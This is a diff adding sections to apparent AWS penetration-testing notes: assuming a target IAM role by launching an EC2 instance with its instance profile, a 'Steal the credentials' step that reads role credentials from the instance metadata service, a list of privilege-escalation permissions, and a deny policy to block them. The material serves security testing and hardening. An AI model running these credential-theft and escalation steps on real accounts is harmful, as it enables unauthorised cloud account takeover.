@@ -84,6 +84,106 @@ then
 aws sts get-caller-identity --profile target-role
 ```
 
+## Assume role using EC2 Instance Profiles
+* Find the InstanceProfileArn for the target role
+
+```
+aws iam list-instance-profiles-for-role --role-name my-target-role
+```
+* Launch an instance. Needs a lot of info to launch correctly
+```
+aws ec2 run-instances \
+    --image-id $AMI_ID \
+    --instance-type $INSTANCE_TYPE \
+    --count 1 \
+    --subnet-id $SUBNETID \
+    --key-name $KEYPAIR_NAME \
+    --security-group-ids $SECURITY_GROUPS \
+    --iam-instance-profile "Arn=${INSTANCEPROFILE_ARN}" \
+    --tag-specifications 'ResourceType=instance,Tags=[{Key=Name,Value=pentest}]'
+```
+* Steal the credentials
+```
+hostname
+aws sts get-caller-identity
+curl -s http://169.254.169.254/latest/meta-data/iam/info/
+
+export ROLE_NAME=`curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/`
+echo "Instance role is ${ROLE_NAME}"
+curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/${ROLE_NAME}/
+```
+
+# Privilege Escalation Permissions
+These are permissions that allow privilege escalation, though some are limited or require special circumstances.
+
+From [Investigating Privilege Escalation Methods in AWS | Bishop Fox](https://bishopfox.com/blog/privilege-escalation-in-aws)
+```
+iam:CreatePolicyVersion
+iam:SetDefaultPolicyVersion
+iam:PassRole and ec2:RunInstances
+iam:CreateAccessKey
+iam:CreateLoginProfile
+iam:UpdateLoginProfile
+iam:AttachUserPolicy
+iam:AttachGroupPolicy
+iam:AttachRolePolicy
+iam:PutUserPolicy
+iam:PutGroupPolicy
+iam:PutRolePolicy
+iam:AddUserToGroup
+iam:UpdateAssumeRolePolicy
+iam:PassRole, lambda:CreateFunction, and lambda:InvokeFunction
+iam:PassRole, lambda:CreateFunction,and lambda:CreateEventSourceMapping
+lambda:UpdateFunctionCode
+iam:PassRole, glue:CreateDevEndpoint, and glue:GetDevEndpoint(s)
+glue:UpdateDevEndpoint and glue:GetDevEndpoint(s)
+iam:PassRole, cloudformation:CreateStack,and cloudformation:DescribeStacks
+iam:PassRole, datapipeline:CreatePipeline,datapipeline:PutPipelineDefinition, and datapipeline:ActivatePipeline
+```
+
+Additional risky permissions
+```
+iam:CreateRole
+iam:CreateUser
+```
+
+Policy to prevent
+```
+{
+    "Version": "2012-10-17",
+    "Statement": [
+        {
+            "Sid": "RiskyPermissions",
+            "Effect": "Deny",
+            "Action": [
+                "cloudformation:CreateStack",
+                "datapipeline:CreatePipeline",
+                "ec2:RunInstances",
+                "glue:UpdateDevEndpoint",
+                "iam:AddUserToGroup",
+                "iam:AttachGroupPolicy",
+                "iam:AttachRolePolicy",
+                "iam:AttachUserPolicy",
+                "iam:CreateAccessKey",
+                "iam:CreateLoginProfile",
+                "iam:CreatePolicyVersion",
+                "iam:CreateRole",
+                "iam:CreateUser",
+                "iam:PassRole",
+                "iam:PutGroupPolicy",
+                "iam:PutRolePolicy",
+                "iam:PutUserPolicy",
+                "iam:SetDefaultPolicyVersion",
+                "iam:UpdateAssumeRolePolicy",
+                "iam:UpdateLoginProfile",
+                "lambda:UpdateFunctionCode"
+            ],
+            "Resource": "*"
+        }
+    ]
+}
+```
+
 ## References
 * [How to use trust policies with IAM roles](https://aws.amazon.com/blogs/security/how-to-use-trust-policies-with-iam-roles/)
 * [AWS JSON policy elements: Principal - AWS Identity and Access Management](https://docs.aws.amazon.com/IAM/latest/UserGuide/reference_policies_elements_principal.html)
